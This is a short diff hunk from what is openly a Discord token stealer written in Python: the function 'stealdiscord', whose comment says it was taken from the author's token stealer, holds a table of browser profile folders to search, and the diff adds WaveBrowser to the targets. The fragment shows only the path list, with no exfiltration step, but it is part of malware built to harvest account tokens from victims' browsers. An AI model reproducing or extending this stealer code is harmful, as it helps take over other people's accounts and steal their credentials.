@@ -471,6 +471,7 @@ def stealdiscord(): #stole this from my token stealer
     '0Epic': os.path.join(local, 'Epic Privacy Browser', 'User Data'),
     '0Thorium': os.path.join(local, 'Thorium', 'User Data'),
     '0Cromite': os.path.join(local, 'Cromite', 'User Data'),
+    '0WaveBrowser': os.path.join(local, 'WaveBrowser', 'User Data'),
     '0CocCoc': os.path.join(local, 'CocCoc', 'Browser', 'User Data'),
     '0Hola': os.path.join(roaming, 'Hola', 'chromium_profile'),
     '0Iridium': os.path.join(local, "Iridium", "User Data"),
